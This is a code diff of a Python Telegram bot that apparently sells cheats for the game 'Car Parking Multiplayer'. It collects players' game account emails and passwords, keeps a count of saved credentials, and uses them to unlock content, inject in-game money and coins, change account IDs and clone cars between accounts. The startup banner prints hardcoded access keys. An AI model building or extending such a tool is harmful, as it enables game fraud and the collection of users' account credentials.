+            f"  • Credentials Saved: **{total_credentials}**\n"
+            f"  • Changes Logged: **{total_changes}**\n"
+            f"  • Keys/Trials: **{total_keys}**\n"
+            f"  • Unique Users: **{len(unique_users)}**\n\n"
+            f"🎮 **GAME BREAKDOWN:**\n"
+            f"  • CPM1: **{cpm1_count}**\n"
+            f"  • CPM2: **{cpm2_count}**\n\n"
+            f"⏰ **24h Activity:** **{recent_count}**\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            f"💾 Use /backupnow to download full backup.\n"
+            f"📥 Use /download_logs for detailed logs."
+        )
+        bot.edit_message_text(dashboard_text, chat_id, msg.message_id, parse_mode='Markdown')
+    except Exception as e:
+        bot.edit_message_text(f"❌ **Failed to load dashboard:** {str(e)}", chat_id, msg.message_id, parse_mode='Markdown')
+
+# ═══════════════════════════════════════════════════════════
 # 🎯 CALLBACK HANDLER
 # ═══════════════════════════════════════════════════════════
 
@@ -2797,7 +2820,6 @@ def handle_callback(call):
 
     web_uid = get_web_uid(chat_id)
 
-    # ---- execute_cpm1 function ----
     def execute_cpm1(feature_name, feature_func, *args, cost=COST_INDIVIDUAL):
         if chat_id not in user_sessions or not user_sessions[chat_id].get('logged_in') or user_sessions[chat_id].get('version') != "1":
             bot.send_message(chat_id, "❌ **You must login to CPM1 first!**", parse_mode='Markdown')
@@ -2833,7 +2855,6 @@ def handle_callback(call):
             show_cpm1_menu(chat_id, call.message)
         return
 
-    # ---- CPM1 features (with coin costs) ----
     if data == "cpm1_change_email":
         bot.send_message(chat_id, "📧 **Enter new email:**", parse_mode='Markdown')
         user_states[chat_id] = {'awaiting_cpm1_email': True}
@@ -2908,7 +2929,6 @@ def handle_callback(call):
         execute_cpm1("Ultimate Unlock", nuker.unlock_all_features, cost=COST_BULK)
         return
 
-    # ---- Unlock Cars menu ----
     if data == "unlock_manual":
         if chat_id not in user_sessions or not user_sessions[chat_id].get('unlock_email') or not user_sessions[chat_id].get('unlock_pass'):
             bot.send_message(chat_id, "❌ **Missing data! Start from Unlock Cars again.**", parse_mode='Markdown')
@@ -2971,12 +2991,10 @@ def handle_callback(call):
         show_cpm1_menu(chat_id)
         return
 
-    # ---- CPM2 (under maintenance) ----
     if data == "cpm2_king_rank" or data == "cpm2_generate" or data == "cpm2_maintenance":
         bot.send_message(chat_id, "🛠️ **CPM2 is currently under maintenance.**\n━━━━━━━━━━━━━━━━━━━━━\n⏳ Please check back later.\n\n📌 For inquiries, contact @Maarkryan.", parse_mode='Markdown')
         return
 
-    # ---- Logout ----
     if data == "logout":
         if chat_id in user_sessions:
             user_sessions[chat_id] = {}
@@ -2997,7 +3015,6 @@ def handle_callback(call):
         )
         return
 
-    # ---- Admin Panel ----
     if data == "admin_panel":
         if not is_admin(chat_id):
             bot.send_message(chat_id, get_text(chat_id, "not_admin"), parse_mode='Markdown')
@@ -3005,7 +3022,6 @@ def handle_callback(call):
         bot.send_message(chat_id, get_text(chat_id, "admin_panel"), reply_markup=create_admin_keyboard(chat_id), parse_mode='Markdown')
         return
 
-    # ---- Admin actions ----
     if data == "admin_download_logs":
         if not is_admin(chat_id):
             return
@@ -3248,7 +3264,6 @@ def handle_callback(call):
         admin_panel(call.message)
         return
 
-    # ---- SUBSCRIPTION ----
     if data == "subscription_menu":
         bot.send_message(chat_id, get_text(chat_id, "subscription_menu"), reply_markup=create_subscription_duration_keyboard(), parse_mode='Markdown')
         return
@@ -3473,7 +3488,7 @@ def handle_callback(call):
     bot.answer_callback_query(call.id, "🔹 Executing...")
 
 # ═══════════════════════════════════════════════════════════
-# 📝 KEY HANDLERS (Normal, Time, Trial)
+# 📝 KEY HANDLERS
 # ═══════════════════════════════════════════════════════════
 
 def check_time_key(message):
@@ -3715,12 +3730,11 @@ def get_password(message):
             bot.register_next_step_handler(message, get_email)
         return
     else:
-        # CPM2 login - disabled
         bot.send_message(chat_id, "🛠️ **CPM2 is under maintenance.**\n━━━━━━━━━━━━━━━━━━━━━\n⏳ Please check back later.", parse_mode='Markdown')
         return
 
 # ═══════════════════════════════════════════════════════════
-# 📝 MESSAGE HANDLER (for inputs)
+# 📝 MESSAGE HANDLER
 # ═══════════════════════════════════════════════════════════
 
 @bot.message_handler(content_types=["successful_payment"])
@@ -3802,7 +3816,6 @@ def handle_all_messages(message):
     if chat_id in user_states:
         state = user_states[chat_id]
 
-        # SUBSCRIPTION PHOTO
         if state.get('awaiting_subscription_photo'):
             if not message.photo:
                 if text and (text.strip().startswith('/') or text.strip().lower() in ('cancel', 'batalin', 'back')):
@@ -3886,7 +3899,6 @@ def handle_all_messages(message):
                 del user_states[chat_id]['awaiting_subscription_photo']
             return
 
-        # CPM1 - Change Email
         if state.get('awaiting_cpm1_email'):
             web_uid = user_sessions[chat_id].get('web_uid')
             if not web_uid:
@@ -3911,7 +3923,6 @@ def handle_all_messages(message):
             show_cpm1_menu(chat_id)
             return
 
-        # CPM1 - Change Password
         if state.get('awaiting_cpm1_pass'):
             new_pass = text.strip()
             if len(new_pass) < 6:
@@ -3936,7 +3947,6 @@ def handle_all_messages(message):
             show_cpm1_menu(chat_id)
             return
 
-        # Clone Account
         if state.get('awaiting_clone_source_email'):
             user_sessions[chat_id]['clone_source_email'] = text.strip()
             bot.send_message(chat_id, "🔑 **Enter source account password:**", parse_mode='Markdown')
@@ -3957,23 +3967,19 @@ def handle_all_messages(message):
             source_pass = user_sessions[chat_id].get('clone_source_pass')
             target_email = user_sessions[chat_id].get('clone_target_email')
             target_pass = text.strip()
-            # Coin already deducted in callback, just execute
-            bot.send_message(chat_id, "⏳ **Cloning account...**\n⏱️ Please wait, this is running fast now!", parse_mode='Markdown')
-            result = cpm1_clone_account(source_email, source_pass, target_email, target_pass)
-            if result[0] == True:
-                data = result[1]
-                bot.send_message(chat_id, get_text(chat_id, "clone_success", success=data['success'], total=data['total']), parse_mode='Markdown')
-            elif result[0] == "partial":
-                data = result[1]
-                bot.send_message(chat_id, f"⚠️ **Partial clone**\n✅ Success: {data['success']}/{data['total']}\n❌ Failed: {data['fail']}", parse_mode='Markdown')
+            loading_msg = bot.send_message(chat_id, "⏳ **Cloning account...**\n⏱️ Please wait, progress will be shown below:", parse_mode='Markdown')
+            success, fail, total = cpm1_clone_account_chunked(source_email, source_pass, target_email, target_pass, chat_id, loading_msg.message_id)
+            if success == total:
+                result_text = f"🎉 **CLONE COMPLETED!**\n━━━━━━━━━━━━━━━━━━━━━\n✅ Successfully cloned: {success}/{total} cars\n🎨 Vinyl designs included!\n❌ Failed: {fail}\n━━━━━━━━━━━━━━━━━━━━━\n🚗 Open your garage in-game!"
+            elif success > 0:
+                result_text = f"⚠️ **Partial clone completed**\n━━━━━━━━━━━━━━━━━━━━━\n✅ Successfully cloned: {success}/{total} cars\n🎨 Vinyl designs included!\n❌ Failed: {fail}\n━━━━━━━━━━━━━━━━━━━━━\n🚗 Some cars may not have been cloned."
             else:
-                data = result[1]
-                bot.send_message(chat_id, get_text(chat_id, "clone_fail", error=data.get('error', 'Unknown error')), parse_mode='Markdown')
+                result_text = f"❌ **Clone failed!**\n━━━━━━━━━━━━━━━━━━━━━\n💀 Could not clone cars from source account.\n🔁 Please check your credentials and try again.\n━━━━━━━━━━━━━━━━━━━━━\n📊 Failed: {fail}/{total}"
+            bot.edit_message_text(result_text, chat_id, loading_msg.message_id, parse_mode='Markdown')
             del user_states[chat_id]
             show_cpm1_menu(chat_id)
             return
 
-        # Unlock Cars
         if state.get('awaiting_unlock_email'):
             email = text.strip()
             if '@' not in email or '.' not in email:
@@ -4033,7 +4039,6 @@ def handle_all_messages(message):
                 bot.send_message(chat_id, "❌ **Invalid number!** Must be a number.", parse_mode='Markdown')
             return
 
-        # Change ID
         if state.get('awaiting_change_id'):
             new_id = text.strip().upper()
             if not new_id:
@@ -4056,7 +4061,6 @@ def handle_all_messages(message):
             show_cpm1_menu(chat_id)
             return
 
-        # Add Money
         if state.get('awaiting_money'):
             try:
                 amount = int(text.strip().replace(',', '').replace('_', ''))
@@ -4086,7 +4090,6 @@ def handle_all_messages(message):
             show_cpm1_menu(chat_id)
             return
 
-        # Add Coins
         if state.get('awaiting_coin'):
             try:
                 amount = int(text.strip().replace(',', '').replace('_', ''))
@@ -4116,7 +4119,6 @@ def handle_all_messages(message):
             show_cpm1_menu(chat_id)
             return
 
-        # Admin: Time Key - Create
         if state.get('awaiting_time_key_hours'):
             if not is_admin(chat_id):
                 del user_states[chat_id]
@@ -4145,7 +4147,6 @@ def handle_all_messages(message):
             admin_panel(message)
             return
 
-        # Admin: Time Key - Delete
         if state.get('awaiting_time_key_delete'):
             if not is_admin(chat_id):
                 del user_states[chat_id]
@@ -4160,7 +4161,6 @@ def handle_all_messages(message):
             admin_panel(message)
             return
 
-        # Admin: Broadcast
         if state.get('awaiting_broadcast'):
             if not is_admin(chat_id):
                 del user_states[chat_id]
@@ -4178,7 +4178,6 @@ def handle_all_messages(message):
             admin_panel(message)
             return
 
-        # Admin: Manage Keys
         if state.get('awaiting_add_key'):
             if not is_admin(chat_id):
                 del user_states[chat_id]
@@ -4206,7 +4205,6 @@ def handle_all_messages(message):
             admin_panel(message)
             return
 
-        # Admin: Ban / Unban
         if state.get('awaiting_ban'):
             if not is_admin(chat_id):
                 del user_states[chat_id]
@@ -4240,33 +4238,16 @@ def handle_all_messages(message):
         bot.send_message(chat_id, "❌ **Unknown command!**", parse_mode='Markdown')
 
 # ═══════════════════════════════════════════════════════════
-# 🚀 START BOT POLLING IN BACKGROUND (para sa gunicorn)
+# 🚀 START BOT (SINGLE INSTANCE - NO 409)
 # ═══════════════════════════════════════════════════════════
 
-_bot_started = False
+def start_bot():
+    try:
+        bot.delete_webhook(drop_pending_updates=True)
+        print("🧹 Webhook cleared, pending updates dropped")
+    except Exception as e:
+        print(f"⚠️ Webhook cleanup: {e}")
 
-def start_bot_polling():
-    global _bot_started
-    if _bot_started:
-        return
-    _bot_started = True
-    print("🚀 Starting bot polling in background thread...")
-    while True:
-        try:
-            bot.polling(none_stop=True, timeout=20)
-        except Exception as e:
-            print(f"❌ Bot polling error: {e}")
-            time.sleep(5)
-
-# Start bot polling when module is imported (for gunicorn)
-threading.Thread(target=start_bot_polling, daemon=True).start()
-
-# ═══════════════════════════════════════════════════════════
-# 🚀 BOT START (for direct run - python bot.py)
-# ═══════════════════════════════════════════════════════════
-
-if __name__ == "__main__":
-    # This block runs only when executed directly (not via gunicorn)
     print("="*60)
     print("𝙈𝘼𝙍𝙆𝘾𝙋𝙈1𝙏𝙊𝙊𝙋𝙎 - CPM1 + CPM2 (MAINTENANCE)")
     print("="*60)
@@ -4275,16 +4256,17 @@ if __name__ == "__main__":
     print("🔑 Keys: MARKMWEHEHETOOL7077, MARKK, TANNER")
     print("="*60)
 
-    try:
-        bot.delete_webhook(drop_pending_updates=True)
-        print("🧹 Webhook cleared, pending updates dropped")
-    except Exception as e:
-        print(f"⚠️ Webhook cleanup: {e}")
+    flask_thread = threading.Thread(target=run_flask, daemon=True)
+    flask_thread.start()
+    print("🌐 Flask health server started in background (port 10000)")
 
     print("🚀 Starting long-polling (bot will stay alive 24/7)...")
     while True:
         try:
-            bot.polling(none_stop=True, timeout=20)
+            bot.polling(none_stop=True, timeout=20, interval=0)
         except Exception as e:
             print(f"❌ Error: {e}")
             time.sleep(5)
+
+if __name__ == "__main__":
+    start_bot()
